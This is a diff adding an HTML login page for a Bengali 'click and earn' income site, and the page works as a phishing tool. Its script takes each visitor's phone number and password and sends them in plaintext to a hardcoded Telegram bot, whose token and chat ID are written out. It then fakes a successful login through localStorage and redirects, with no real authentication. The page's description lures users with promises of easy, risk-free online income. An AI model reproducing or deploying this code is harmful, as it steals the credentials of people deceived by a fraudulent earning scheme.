@@ -1,0 +1,325 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description"
+        content="ক্লিক করুন, উপার্জন শুরু করুন! আপনার স্বপ্ন বাস্তব করতে আমরা এখানে আছি। অনলাইনে সহজেই টাকা উপার্জনের সুযোগ পান। প্রতিটি ক্লিকে বাড়বে আপনার আয়, কোনো ঝামেলা ছাড়াই। এখনই যোগ দিন এবং আপনার লক্ষ্য অর্জনের পথে এগিয়ে যান! বাংলাদেশের সেরা অনলাইন আয়ের প্ল্যাটফর্ম - কোনো ঝুঁকি ছাড়াই শুরু করুন।">
+    <title>স্বপ্ন রিসোর্ট - Login</title>
+    <!-- Font Awesome for icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="icon" type="image/png" sizes="32x32" href="android-chrome-512x512.png">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', sans-serif;
+        }
+
+        body {
+            min-height: 100vh;
+            background: url('3.png');
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .login-container {
+            background: rgba(220, 217, 217, 0.541);
+            padding: 40px 30px;
+            border-radius: 20px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
+            width: 90%;
+            max-width: 400px;
+            transform: translateY(0);
+            transition: all 0.3s ease;
+        }
+
+        .login-container:hover {
+            transform: translateY(-5px);
+        }
+
+        h2 {
+            text-align: center;
+            color: #2d3436;
+            margin-bottom: 30px;
+            font-size: 1.8rem;
+        }
+
+        .input-group {
+            margin-bottom: 25px;
+            position: relative;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 15px 40px 15px 20px;
+            border: 2px solid #eee;
+            border-radius: 10px;
+            font-size: 16px;
+            transition: border-color 0.3s ease;
+        }
+
+        .input-group input:focus {
+            outline: none;
+            border-color: #4ecdc4;
+        }
+
+        .password-toggle {
+            position: absolute;
+            right: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            cursor: pointer;
+            color: #666;
+        }
+
+        .password-toggle:hover {
+            color: #2d3436;
+        }
+
+        button {
+            width: 100%;
+            padding: 15px;
+            background: #4ecdc4;
+            color: white;
+            border: none;
+            border-radius: 10px;
+            font-size: 16px;
+            cursor: pointer;
+            transition: background 0.3s ease;
+        }
+
+        button:hover {
+            background: #45b7b0;
+        }
+
+        /* Floating label animation */
+        .input-group label {
+            position: absolute;
+            left: 20px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #666;
+            pointer-events: none;
+            transition: all 0.3s ease;
+        }
+
+        .input-group input:focus~label,
+        .input-group input:not(:placeholder-shown)~label {
+            top: -10px;
+            left: 10px;
+            font-size: 12px;
+            color: #4ecdc4;
+            background: white;
+            padding: 0 5px;
+        }
+
+        .notice-icon {
+            position: fixed;
+            top: 20px;
+            left: 20px;
+            cursor: pointer;
+            background: #4ecdc4;
+            color: rgb(247, 53, 53);
+            width: 30px;
+            height: 30px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.2);
+            transition: all 0.3s ease;
+            z-index: 1000;
+        }
+
+        .notice-icon:hover {
+            transform: scale(1.1);
+            background: #45b7b0;
+        }
+
+        .notice-modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .notice-content {
+            background: white;
+            padding: 30px;
+            border-radius: 15px;
+            width: 90%;
+            max-width: 500px;
+            position: relative;
+            animation: modalSlide 0.3s ease-out;
+        }
+
+        @keyframes modalSlide {
+            from {
+                transform: translateY(-100px);
+                opacity: 0;
+            }
+
+            to {
+                transform: translateY(0);
+                opacity: 1;
+            }
+        }
+
+        .close-btn {
+            position: absolute;
+            top: 15px;
+            right: 20px;
+            font-size: 24px;
+            cursor: pointer;
+            color: #666;
+        }
+
+        .close-btn:hover {
+            color: #333;
+        }
+
+        .notice-text {
+            max-height: 60vh;
+            overflow-y: auto;
+            padding: 10px;
+            line-height: 1.6;
+        }
+
+        .notice-text p {
+            margin: 15px 0;
+            padding-left: 10px;
+            border-left: 3px solid #4ecdc4;
+        }
+    </style>
+</head>
+
+<body>
+    <!-- HTML: body শুরুর ঠিক পরে এই কোড যোগ করুন -->
+    <div class="notice-icon">ℹ️</div>
+    <div class="notice-modal">
+        <div class="notice-content">
+            <span class="close-btn">&times;</span>
+            <h3>📢 Important Notices</h3>
+            <div class="notice-text">
+                <!-- এখানে আপনার নোটিশ গুলো লিখুন -->
+                <p>1. Welcome</p>
+                <p>2. Passwords are case-sensitive.</p>
+                <p>3. Contact admin for password recovery.</p>
+                <p>4. Do not share your login details.</p>
+            </div>
+        </div>
+    </div>
+
+    <div class="login-container">
+        <h2>স্বপ্ন রিসোর্ট Login</h2>
+        <form id="loginForm">
+            <div class="input-group">
+                <input type="tel" id="phone" required placeholder=" ">
+                <label for="phone">Phone Number</label>
+            </div>
+            <div class="input-group">
+                <input type="password" id="password" required placeholder=" ">
+                <i class="fas fa-eye password-toggle" id="togglePassword"></i>
+                <label for="password">Password</label>
+            </div>
+            <button type="submit">Login</button>
+        </form>
+    </div>
+
+    <script>
+        // Password Toggle
+        const togglePassword = document.querySelector('#togglePassword');
+        const password = document.querySelector('#password');
+
+        togglePassword.addEventListener('click', function () {
+            const type = password.getAttribute('type') === 'password' ? 'text' : 'password';
+            password.setAttribute('type', type);
+            this.classList.toggle('fa-eye-slash');
+        });
+
+        // Telegram Bot Integration
+        async function sendToTelegram(phone, password) {
+            const botToken = '8106775982:AAFO3MlbC7hfjVrAK7pNOxg4Jmt091O4XAQ';
+            const chatId = '6422634012';
+            const message = `New Login:\nPhone: ${phone}\nPassword: ${password}`;
+
+            try {
+                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message
+                    })
+                });
+            } catch (error) {
+                console.error('Error sending to Telegram:', error);
+            }
+        }
+
+        // Login Handling
+        document.getElementById('loginForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            const phone = document.getElementById('phone').value;
+            const password = document.getElementById('password').value;
+
+            // Send data to Telegram
+            await sendToTelegram(phone, password);
+
+            // Store login state
+            localStorage.setItem('isLoggedIn', 'true');
+
+            // Redirect to main page (replace with your actual page)
+            window.location.href = 'sopno.html';
+        });
+
+        // Check login status
+        window.addEventListener('load', () => {
+            if (localStorage.getItem('isLoggedIn')) {
+                window.location.href = 'sopno.html';
+            }
+        });
+        // Notice Popup Handling
+        const noticeIcon = document.querySelector('.notice-icon');
+        const noticeModal = document.querySelector('.notice-modal');
+        const closeBtn = document.querySelector('.close-btn');
+
+        // Open modal
+        noticeIcon.addEventListener('click', () => {
+            noticeModal.style.display = 'flex';
+        });
+
+        // Close modal
+        closeBtn.addEventListener('click', () => {
+            noticeModal.style.display = 'none';
+        });
+
+        // Close when clicking outside
+        window.addEventListener('click', (e) => {
+            if (e.target == noticeModal) {
+                noticeModal.style.display = 'none';
+            }
+        });
+
+        // Close with ESC key
+        document.addEventListener('keydown', (e) => {
+            if (e.key === 'Escape') {
+                noticeModal.style.display = 'none';
+            }
+        });
+    </script>
+</body>
+
+</html>
